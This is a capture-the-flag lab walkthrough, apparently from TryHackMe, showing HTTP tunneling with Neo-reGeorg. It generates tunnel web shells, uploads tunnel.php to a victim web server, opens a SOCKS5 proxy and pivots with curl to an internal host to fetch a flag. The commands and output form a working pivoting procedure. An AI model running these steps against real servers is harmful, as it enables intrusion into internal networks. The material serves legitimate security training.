# HTTP tunneling

|                                                 ![HTTP tunnel](/_static/images/http-tunnel.png)                                                 |
|:-----------------------------------------------------------------------------------------------------------------------------------------------:|
| With tunneling over the HTTP protocol technique other protocols are encapsulated and <br>data can be sent back and forth via the HTTP protocol. |

Use the [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) tool to create a communication channel to access the 
internal network devices:

```text
root@kali:# cd /opt
root@kali:# ls
firmware-mod-kit  kerbrute   Neo-reGeorg-master.zip  Teeth
impacket          microsoft  nessus                  xplico

root@kali:# unzip Neo-reGeorg-master.zip 
Archive:  Neo-reGeorg-master.zip
a9495cabdd59dc1df645742c99c2c7a02702dbf8
   creating: Neo-reGeorg-master/
  inflating: Neo-reGeorg-master/.gitignore  
  inflating: Neo-reGeorg-master/CHANGELOG-en.md  
  inflating: Neo-reGeorg-master/CHANGELOG.md  
  inflating: Neo-reGeorg-master/LICENSE  
  inflating: Neo-reGeorg-master/README-en.md  
  inflating: Neo-reGeorg-master/README.md  
  inflating: Neo-reGeorg-master/neoreg.py  
   creating: Neo-reGeorg-master/templates/
  inflating: Neo-reGeorg-master/templates/NeoreGeorg.java  
  inflating: Neo-reGeorg-master/templates/tunnel.ashx  
  inflating: Neo-reGeorg-master/templates/tunnel.aspx  
  inflating: Neo-reGeorg-master/templates/tunnel.jsp  
  inflating: Neo-reGeorg-master/templates/tunnel.jspx  
  inflating: Neo-reGeorg-master/templates/tunnel.php  

root@kali:# cd Neo-reGeorg-master 
                                                                                
root@kali:# ls
CHANGELOG-en.md  LICENSE    README-en.md  templates
CHANGELOG.md     neoreg.py  README.md
```

Generate an encrypted client file to upload to the victim web server:

    root@kali:# python3 neoreg.py generate -k thm

          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.1
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx

The command generates encrypted tunneling clients with thm key in the `neoreg_servers/` directory. There are many 
extensions, including for PHP, ASPX, JSP, etc. 

To access the uploader machine, visit `https://LAB_WEB_URL.p.thmlabs.com/uploader`:

|                                       ![upload](/_static/images/upload-exfiltr.png)                                       |
|:-------------------------------------------------------------------------------------------------------------------------:|
| Upload the `tunnel.php` file via the uploader machine. <br>Use `admin` as the key to allow upload into `uploader.thm.com` |

Use `neoreg.py` to connect to the client, provide the key to decrypt the tunneling client, and the URL to the 
`tunnel.php` just uploaded on the uploader machine.

    root@kali:# python3 neoreg.py -k thm -u http://10.10.177.27/uploader/files/tunnel.php


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.1
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

    +------------------------------------------------------------------------+
      Log Level set to [ERROR]
      Starting SOCKS5 server [127.0.0.1:1080]
      Tunnel at:
        http://10.10.177.27/uploader/files/tunnel.php
    +------------------------------------------------------------------------+

Ready to use the tunnel connection as a proxy binds on our local machine, 127.0.0.1, on port 1080:
 
    root@kali:# curl --socks5 127.0.0.1:1080 http://172.20.0.120:80
    <p><a href="/flag">Get Your Flag!</a></p>
                                                                                
    root@kali:# curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag

Done.
